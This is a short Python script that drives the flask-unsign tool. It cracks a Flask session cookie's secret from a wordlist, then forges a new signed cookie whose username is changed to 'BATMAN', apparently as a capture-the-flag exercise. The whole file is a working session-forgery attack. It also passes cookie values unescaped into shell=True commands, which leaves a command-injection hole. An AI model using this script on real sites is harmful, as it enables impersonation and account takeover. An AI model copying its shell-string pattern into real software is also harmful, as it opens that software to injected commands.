import subprocess

def unsign_cookie(cookie):
    try:
        result = subprocess.run(f"flask-unsign --unsign --cookie \"{cookie}\" --no-literal-eval -w pws.txt", shell=True)
        return result
    except Exception as e:
        print(f"An error occurred: {e}")
        return None

def alter_cookie(cookieSecret, newPayload):

    signed_cookie = subprocess.run(f"flask-unsign --sign --cookie \"{newPayload}\" --secret '{cookieSecret}'", shell=True)

if __name__ == "__main__":
    encrypted_cookie = "eyJ1c2VybmFtZSI6Ik1hcmNvIn0.aFESOQ.WvNJg4Vv_9hE4UPGjdbbnqmRK6A"
    payload = "{'username': 'BATMAN'}"
    alter_cookie("password1234", payload)
    unsign_cookie(encrypted_cookie)